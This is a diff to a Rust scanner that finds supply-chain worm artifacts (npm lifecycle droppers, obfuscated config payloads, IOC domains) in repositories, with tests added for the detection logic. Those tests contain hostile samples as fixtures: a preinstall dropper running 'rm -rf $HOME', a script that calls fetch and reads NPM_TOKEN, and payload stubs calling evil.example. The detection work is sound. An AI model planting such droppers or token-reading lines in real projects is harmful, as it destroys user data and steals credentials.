@@ -39,9 +39,19 @@ fn build_globset(patterns: &[String]) -> GlobSet {
 
 fn check_artifacts(repo: &Path, files: &dyn RepoFiles, pack: &Pack) -> Vec<Finding> {
     let mut findings = Vec::new();
+    // Case-insensitive filesystems (macOS/APFS, Windows) report the same physical file for
+    // artifact paths that differ only in case (e.g. shai-hulud-workflow.yml vs
+    // Shai-hulud-workflow.yml). Dedup by the canonical on-disk path so one physical file
+    // yields one finding; on a case-sensitive tree the paths canonicalize apart (or the
+    // fallback keeps them distinct), so genuinely separate files are both still reported.
+    let mut seen: HashSet<PathBuf> = HashSet::new();
     for artifact in &pack.manifest.artifacts {
         let ap = PathBuf::from(&artifact.path);
         if files.exists(&ap) {
+            let identity = std::fs::canonicalize(repo.join(&ap)).unwrap_or_else(|_| ap.clone());
+            if !seen.insert(identity) {
+                continue;
+            }
             findings.push(Finding {
                 campaign: pack.manifest.id.clone(),
                 severity: pack.manifest.severity.clone(),
@@ -135,6 +145,12 @@ pub fn scan_files(repo: &Path, files: &dyn RepoFiles, packs: &[Pack]) -> Vec<Fin
     let mut findings = Vec::new();
 
     for rel in files.paths() {
+        // Build-output dirs and minified bundles carry legitimately obfuscated/high-entropy
+        // code; exclude them here so the pack pass matches the capability pass and does not
+        // fire (e.g. entropy-tail) on benign minified output.
+        if is_excluded_path(rel) {
+            continue;
+        }
         // Which packs target this file?
         let targeting: Vec<usize> = globsets
             .iter()
@@ -212,6 +228,15 @@ pub fn scan_files(repo: &Path, files: &dyn RepoFiles, packs: &[Pack]) -> Vec<Fin
         findings.extend(check_gitignore(repo, files, pack));
         findings.extend(check_npm(repo, files, pack));
     }
+
+    // `remediable` must track whether an auto-remediation action actually exists
+    // (remediate::action_for is the single source of that mapping). A ContentSignature
+    // or Analyzer hit from a campaign with no strip strategy is NOT auto-remediable;
+    // stamping it true would let exit-code resolution and branch-tip routing treat
+    // unfixable malware as "resolved". Re-stamp uniformly so no path drifts.
+    for f in &mut findings {
+        f.remediable = crate::remediate::action_for(f, packs).is_some();
+    }
     findings
 }
 
@@ -247,21 +272,33 @@ fn push_if_gated(
 /// Promote local `node ./X.js` targets of an auto-run command to `DerivedScript`
 /// units and score them (one hop). `scored` dedups against files already scored
 /// under another surface, so a reachable file is never double-reported.
+///
+/// `base` is the directory the command runs from: a package.json lifecycle script
+/// runs with CWD = its manifest dir, a workflow/tasks step from the repo root. The
+/// manifest-relative path is tried first (spec §6), then the repo-root path, so
+/// nested-monorepo droppers are reached without regressing root-level ones.
 fn expand_derived(
     findings: &mut Vec<Finding>,
     repo: &Path,
     files: &dyn RepoFiles,
     scored: &mut HashSet<PathBuf>,
+    base: &Path,
     command: &str,
 ) {
     for tgt in derived_targets(command) {
-        let tp = PathBuf::from(&tgt);
-        if is_excluded_path(&tp) || !scored.insert(tp.clone()) {
-            continue;
+        let mut candidates = vec![base.join(&tgt)];
+        let root_rel = PathBuf::from(&tgt);
+        if !candidates.contains(&root_rel) {
+            candidates.push(root_rel);
         }
-        if let Some(dc) = files.read(&tp) {
-            if dc.len() <= MAX_CONTENT_BYTES && !looks_binary(&dc) {
-                push_if_gated(findings, repo, tp, Surface::DerivedScript, &dc);
+        for tp in candidates {
+            if is_excluded_path(&tp) || !scored.insert(tp.clone()) {
+                continue;
+            }
+            if let Some(dc) = files.read(&tp) {
+                if dc.len() <= MAX_CONTENT_BYTES && !looks_binary(&dc) {
+                    push_if_gated(findings, repo, tp, Surface::DerivedScript, &dc);
+                }
             }
         }
     }
@@ -274,8 +311,50 @@ pub fn scan_capabilities(repo: &Path, files: &dyn RepoFiles) -> Vec<Finding> {
     let mut findings = Vec::new();
     // Real file paths already scored under some surface — prevents a reachable
     // DerivedScript that is also a classified ConfigFile from double-reporting.
+    // DerivedScript is claimed in pass 0 (below), before the classify pass, so a file
+    // that is both a reachable dropper and a classified ConfigFile is scored under the
+    // strictly-more-sensitive DerivedScript surface regardless of `files.paths()` order.
     let mut scored: HashSet<PathBuf> = HashSet::new();
 
+    // --- Pass 0: one-hop reachability (DerivedScript). ---
+    // Only command-bearing files are read here (package.json lifecycle scripts, workflow
+    // and folder-open tasks.json bodies); their local `node ./X.js` targets are promoted
+    // to DerivedScript and scored first.
+    for rel in files.paths() {
+        if is_excluded_path(rel) {
+            continue;
+        }
+        let is_pkg = rel.file_name().map(|n| n == "package.json").unwrap_or(false);
+        let cmd_surface =
+            classify(rel).filter(|s| matches!(s, Surface::WorkflowFile | Surface::TasksJson));
+        if !is_pkg && cmd_surface.is_none() {
+            continue;
+        }
+        let content = match files.read(rel) {
+            Some(c) if c.len() <= MAX_CONTENT_BYTES && !looks_binary(&c) => c,
+            _ => continue,
+        };
+        if is_pkg {
+            // Lifecycle scripts run with CWD = the manifest's dir.
+            let base = rel.parent().unwrap_or_else(|| Path::new(""));
+            for (_key, script) in lifecycle_scripts(&content) {
+                expand_derived(&mut findings, repo, files, &mut scored, base, &script);
+            }
+        }
+        if let Some(surface) = cmd_surface {
+            // tasks.json only auto-runs (and thus reaches a dropper) on folder open.
+            let auto_run_ok = surface != Surface::TasksJson || {
+                let low = content.to_lowercase();
+                low.contains("folderopen") || low.contains("allowautomatictasks")
+            };
+            if auto_run_ok {
+                // Workflow / tasks steps run from the repo root.
+                expand_derived(&mut findings, repo, files, &mut scored, Path::new(""), &content);
+            }
+        }
+    }
+
+    // --- Pass 1: classify each file, score lifecycle scripts, check exfil-staging. ---
     for rel in files.paths() {
         if is_excluded_path(rel) {
             continue;
@@ -292,13 +371,9 @@ pub fn scan_capabilities(repo: &Path, files: &dyn RepoFiles) -> Vec<Finding> {
                 let low = content.to_lowercase();
                 low.contains("folderopen") || low.contains("allowautomatictasks")
             };
-            if auto_run_ok {
-                if scored.insert(rel.clone()) {
-                    push_if_gated(&mut findings, repo, rel.clone(), surface, &content);
-                }
-                if matches!(surface, Surface::WorkflowFile | Surface::TasksJson) {
-                    expand_derived(&mut findings, repo, files, &mut scored, &content);
-                }
+            // A file already claimed as DerivedScript in pass 0 is skipped here.
+            if auto_run_ok && scored.insert(rel.clone()) {
+                push_if_gated(&mut findings, repo, rel.clone(), surface, &content);
             }
         }
 
@@ -306,7 +381,6 @@ pub fn scan_capabilities(repo: &Path, files: &dyn RepoFiles) -> Vec<Finding> {
             for (key, script) in lifecycle_scripts(&content) {
                 let vfile = PathBuf::from(format!("{}#{}", rel.display(), key));
                 push_if_gated(&mut findings, repo, vfile, Surface::LifecycleScript, &script);
-                expand_derived(&mut findings, repo, files, &mut scored, &script);
             }
         }
 
@@ -353,13 +427,15 @@ fn scan_git_hooks(repo: &Path) -> Vec<Finding> {
     findings
 }
 
-/// When a campaign (pack) finding already covers a file, drop the additive generic
-/// capability finding on that same file so the report shows the more actionable,
-/// remediable, campaign-attributed finding rather than a duplicate.
+/// When a *remediable* campaign (pack) finding already covers a file, drop the additive
+/// generic capability finding on that same file so the report shows the more actionable,
+/// remediable, campaign-attributed finding rather than a duplicate. A weaker, non-remediable
+/// pack finding (e.g. a Medium `IocDomain` reference) must NOT suppress a Critical capability
+/// finding — otherwise the stronger, actionable evidence is lost to the weaker indicator.
 fn dedup_capability_against_packs(findings: &mut Vec<Finding>) {
     let pack_files: HashSet<PathBuf> = findings
         .iter()
-        .filter(|f| f.kind != FindingKind::Capability)
+        .filter(|f| f.kind != FindingKind::Capability && f.remediable)
         .filter_map(|f| f.file.clone())
         .collect();
     findings.retain(|f| {
@@ -368,12 +444,25 @@ fn dedup_capability_against_packs(findings: &mut Vec<Finding>) {
     });
 }
 
+/// Full campaign + capability scan over any file source (a working tree, a branch tip, or
+/// a clone-free API tree), deduped. This is the single shared body so every scan path —
+/// local (`scan_repo`), deep (`deep_scan_repo`), and GitHub API (`wormward-github`) — runs
+/// the same detectors and can never drift apart.
+///
+/// The physical `.git/hooks` pass and the reflog heuristic are working-tree-only and are
+/// applied separately by `scan_repo`; they cannot run over a non-working-tree source.
+pub fn scan_tree(repo: &Path, files: &dyn RepoFiles, packs: &[Pack]) -> Vec<Finding> {
+    let mut findings = scan_files(repo, files, packs);
+    findings.extend(scan_capabilities(repo, files));
+    dedup_capability_against_packs(&mut findings);
+    findings
+}
+
 pub fn scan_repo(repo: &Path, packs: &[Pack]) -> Vec<Finding> {
     let working = WorkingTree::new(repo);
-    let mut findings = scan_files(repo, &working, packs);
-    findings.extend(scan_capabilities(repo, &working));
+    let mut findings = scan_tree(repo, &working, packs);
+    // .git/hooks is a working-tree-only surface (absent from a GitTree / ApiTree).
     findings.extend(scan_git_hooks(repo));
-    dedup_capability_against_packs(&mut findings);
 
     if !findings.is_empty() && reflog_has_amend(repo) {
         // Attribute the reflog corroboration to a campaign (pack) finding when one
@@ -477,9 +566,7 @@ pub fn deep_scan_repo(repo: &Path, packs: &[Pack]) -> Vec<Finding> {
             Some(t) => t,
             None => continue,
         };
-        let mut tree_findings = scan_files(repo, &tree, packs);
-        tree_findings.extend(scan_capabilities(repo, &tree));
-        dedup_capability_against_packs(&mut tree_findings);
+        let mut tree_findings = scan_tree(repo, &tree, packs);
         for f in &mut tree_findings {
             f.git_ref = Some(name.clone());
         }
@@ -581,6 +668,53 @@ mod tests {
     }
 
     #[test]
+    fn derived_entry_file_scored_as_derivedscript_regardless_of_order() {
+        // app.js is BOTH a classified ConfigFile AND a one-hop derived dropper
+        // (preinstall: node app.js). DerivedScript's gate is a strict superset of
+        // ConfigFile's — it also fires on destructive_wipe/propagation. The surface
+        // decision must be independent of path iteration order: the wipe payload must
+        // fire even though "app.js" sorts before "package.json" (so the ConfigFile
+        // classify pass would otherwise claim it first and miss destructive_wipe).
+        let tmp = TempDir::new().unwrap();
+        let repo = make_repo(&tmp);
+        fs::write(repo.join("package.json"), r#"{"scripts":{"preinstall":"node app.js"}}"#).unwrap();
+        fs::write(repo.join("app.js"), "#!/bin/sh\nrm -rf $HOME\n").unwrap();
+        let files = WorkingTree::new(&repo);
+        let f = scan_capabilities(&repo, &files);
+        assert!(
+            f.iter()
+                .any(|x| x.kind == FindingKind::Capability && x.file == Some(PathBuf::from("app.js"))),
+            "wipe payload in a reachable entry file must fire under DerivedScript regardless of order"
+        );
+    }
+
+    #[test]
+    fn derived_target_resolves_against_manifest_dir() {
+        // A nested manifest packages/web/package.json with "postinstall":"node ./setup.js"
+        // and the payload at packages/web/setup.js. npm runs lifecycle scripts with
+        // CWD = the manifest's dir, so the one-hop target must resolve there, not against
+        // the repo root (spec §6) — otherwise nested-monorepo droppers are missed.
+        let tmp = TempDir::new().unwrap();
+        let repo = make_repo(&tmp);
+        let web = repo.join("packages/web");
+        fs::create_dir_all(&web).unwrap();
+        fs::write(web.join("package.json"), r#"{"scripts":{"postinstall":"node ./setup.js"}}"#)
+            .unwrap();
+        fs::write(
+            web.join("setup.js"),
+            "global['r']=require;fetch('http://x');process.env.NPM_TOKEN",
+        )
+        .unwrap();
+        let files = WorkingTree::new(&repo);
+        let f = scan_capabilities(&repo, &files);
+        assert!(
+            f.iter().any(|x| x.kind == FindingKind::Capability
+                && x.file == Some(PathBuf::from("packages/web/setup.js"))),
+            "nested derived target must resolve against the manifest dir"
+        );
+    }
+
+    #[test]
     fn capability_clean_repo_silent() {
         let tmp = TempDir::new().unwrap();
         let repo = make_repo(&tmp);
@@ -604,6 +738,38 @@ mod tests {
         assert_eq!(findings.len(), 1);
         assert_eq!(findings[0].campaign, "polinrider");
         assert_eq!(findings[0].signature_id, "primary");
+    }
+
+    #[test]
+    fn scan_files_skips_excluded_build_dirs() {
+        // A pack signature (here entropy-tail) must not fire on benign minified output in
+        // build dirs. scan_files must honor the same is_excluded_path exclusions the
+        // capability pass uses, or a dist/index.js bundle produces a Critical false positive.
+        let tmp = TempDir::new().unwrap();
+        let repo = make_repo(&tmp);
+        let dist = repo.join("dist");
+        fs::create_dir_all(&dist).unwrap();
+        const B64: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        let blob: String = (0..600).map(|i| B64[(i * 37) % B64.len()] as char).collect();
+        fs::write(
+            dist.join("index.js"),
+            format!("console.log(1)\n//# sourceMappingURL=data:application/json;base64,{blob}"),
+        )
+        .unwrap();
+
+        let mut pack = literal_pack();
+        pack.manifest.target_files = vec!["index.js".into()];
+        pack.manifest.content_signatures = vec![ContentSignature {
+            id: "entropy-tail".into(),
+            kind: SignatureKind::EntropyOver,
+            value: "5.0".into(),
+        }];
+        let files = WorkingTree::new(&repo);
+        let findings = scan_files(&repo, &files, &[pack]);
+        assert!(
+            !findings.iter().any(|f| f.file == Some(PathBuf::from("dist/index.js"))),
+            "build-dir bundle must be excluded from the pack pass, matching the capability pass"
+        );
     }
 
     #[test]
@@ -698,6 +864,24 @@ mod tests {
     }
 
     #[test]
+    fn artifact_case_variants_dedupe_to_one_physical_file() {
+        // Two artifact paths differing only in case must not yield two findings for a single
+        // physical file on a case-insensitive filesystem (macOS/APFS, Windows). On a
+        // case-sensitive tree they canonicalize apart, so genuinely separate files are kept.
+        let mut pack = literal_pack();
+        pack.manifest.artifacts = vec![
+            crate::pack::Artifact { path: "wf.yml".into(), label: "lower".into() },
+            crate::pack::Artifact { path: "WF.yml".into(), label: "upper".into() },
+        ];
+        let tmp = TempDir::new().unwrap();
+        let repo = make_repo(&tmp);
+        fs::write(repo.join("wf.yml"), "on: push\n").unwrap(); // one physical file
+        let findings = scan_repo(&repo, &[pack]);
+        let artifacts = findings.iter().filter(|f| f.kind == FindingKind::Artifact).count();
+        assert_eq!(artifacts, 1, "one physical file must yield exactly one artifact finding");
+    }
+
+    #[test]
     fn flags_gitignore_injection() {
         let mut pack = literal_pack();
         pack.manifest.gitignore_injections = vec!["config.bat".into()];
@@ -707,6 +891,34 @@ mod tests {
 
         let findings = scan_repo(&repo, &[pack]);
         assert!(findings.iter().any(|f| f.kind == FindingKind::GitignoreInjection));
+    }
+
+    #[test]
+    fn content_signature_remediable_tracks_strip_availability() {
+        // `remediable` must equal "an auto-remediation action exists" (remediate::action_for).
+        // A campaign with content signatures but NO strip strategy (e.g. shai-hulud) must
+        // stamp its ContentSignature findings remediable=false — otherwise exit-code and
+        // branch-routing logic treat unfixable malware as resolved.
+        let tmp = TempDir::new().unwrap();
+        let repo = make_repo(&tmp);
+        fs::write(repo.join("postcss.config.mjs"), "export default {};\nrmcej%otb%").unwrap();
+
+        // No remediation configured -> not auto-remediable.
+        let no_strip = scan_repo(&repo, &[literal_pack()]);
+        let cs = no_strip.iter().find(|f| f.kind == FindingKind::ContentSignature).unwrap();
+        assert!(!cs.remediable, "no strip strategy -> action_for None -> not remediable");
+
+        // Same pack WITH a strip strategy -> auto-remediable.
+        let mut pack = literal_pack();
+        pack.manifest.remediation = Some(crate::pack::Remediation {
+            config_payload: Some(crate::pack::PayloadStrip {
+                strategy: "strip_after_marker".into(),
+                markers: vec!["rmcej".into()],
+            }),
+        });
+        let with_strip = scan_repo(&repo, &[pack]);
+        let cs2 = with_strip.iter().find(|f| f.kind == FindingKind::ContentSignature).unwrap();
+        assert!(cs2.remediable, "strip strategy present -> action_for Some -> remediable");
     }
 
     #[test]
@@ -759,6 +971,54 @@ mod tests {
         git(&clean, &["commit", "-q", "-m", "c"]);
         git(&clean, &["commit", "-q", "-a", "--amend", "-m", "c2"]);
         assert!(!scan_repo(&clean, &[literal_pack()]).iter().any(|f| f.kind == FindingKind::GitReflog));
+    }
+
+    #[test]
+    fn capability_survives_non_remediable_pack_finding_on_same_file() {
+        // A Critical capability finding must NOT be suppressed by a weaker, non-remediable
+        // pack finding (a Medium IocDomain) on the same file. Dedup only drops the additive
+        // generic capability finding when a *remediable* campaign finding already covers it.
+        let tmp = TempDir::new().unwrap();
+        let repo = make_repo(&tmp);
+        let mut pack = literal_pack();
+        pack.manifest.ioc_domains = vec!["evil.example".into()];
+        fs::write(
+            repo.join("postcss.config.mjs"),
+            "export default {};\nglobal['!']='x';var _$_1e42=[];fetch('https://evil.example/x')",
+        )
+        .unwrap();
+        let findings = scan_repo(&repo, &[pack]);
+        assert!(findings.iter().any(|f| f.kind == FindingKind::IocDomain));
+        assert!(
+            findings.iter().any(|f| f.kind == FindingKind::Capability),
+            "capability finding must survive alongside a non-remediable IocDomain on the same file"
+        );
+    }
+
+    #[test]
+    fn capability_deduped_by_remediable_pack_finding_on_same_file() {
+        // When a *remediable* campaign finding (ContentSignature with a strip strategy)
+        // covers the file, the additive generic capability finding IS dropped as a duplicate.
+        let tmp = TempDir::new().unwrap();
+        let repo = make_repo(&tmp);
+        let mut pack = literal_pack();
+        pack.manifest.remediation = Some(crate::pack::Remediation {
+            config_payload: Some(crate::pack::PayloadStrip {
+                strategy: "strip_after_marker".into(),
+                markers: vec!["global['!']=".into()],
+            }),
+        });
+        fs::write(
+            repo.join("postcss.config.mjs"),
+            "export default {};\nglobal['!']='x';var _$_1e42=[];fetch('http://x');rmcej%otb%",
+        )
+        .unwrap();
+        let findings = scan_repo(&repo, &[pack]);
+        assert!(findings.iter().any(|f| f.kind == FindingKind::ContentSignature && f.remediable));
+        assert!(
+            !findings.iter().any(|f| f.kind == FindingKind::Capability),
+            "remediable campaign finding covers the file -> generic capability finding deduped"
+        );
     }
 
     #[test]
@@ -819,6 +1079,44 @@ mod tests {
         let deep = deep_scan_repo(&repo, &[literal_pack()]);
         assert!(deep.iter().any(|f| f.kind == FindingKind::ContentSignature
             && f.git_ref.as_deref() == Some("evil")));
+    }
+
+    #[test]
+    fn deep_scan_prunes_committed_node_modules() {
+        // A branch tip that commits node_modules/<pkg>/postcss.config.mjs must be pruned the
+        // same way the working-tree walk prunes node_modules. GitTree (and ApiTree) must not
+        // scan vendored deps that WorkingTree never sees, or deep scan emits phantom findings.
+        use std::process::Command;
+        fn git(repo: &Path, args: &[&str]) {
+            Command::new("git").arg("-C").arg(repo).args(args)
+                .env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@e.x")
+                .env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@e.x")
+                .status().unwrap();
+        }
+        let tmp = TempDir::new().unwrap();
+        let repo = tmp.path().join("proj");
+        std::fs::create_dir_all(&repo).unwrap();
+        git(&repo, &["init", "-q", "-b", "main"]);
+        std::fs::write(repo.join("readme.md"), "clean").unwrap();
+        git(&repo, &["add", "."]);
+        git(&repo, &["commit", "-q", "-m", "clean"]);
+        git(&repo, &["checkout", "-q", "-b", "vendored"]);
+        let nm = repo.join("node_modules/evil");
+        std::fs::create_dir_all(&nm).unwrap();
+        std::fs::write(nm.join("postcss.config.mjs"), "rmcej%otb%").unwrap();
+        git(&repo, &["add", "-f", "."]);
+        git(&repo, &["commit", "-q", "-m", "vendored payload"]);
+        git(&repo, &["checkout", "-q", "main"]);
+
+        let deep = deep_scan_repo(&repo, &[literal_pack()]);
+        assert!(
+            !deep.iter().any(|f| f
+                .file
+                .as_ref()
+                .map(|p| p.starts_with("node_modules"))
+                .unwrap_or(false)),
+            "committed node_modules must be pruned from the deep (GitTree) scan"
+        );
     }
 
     #[test]
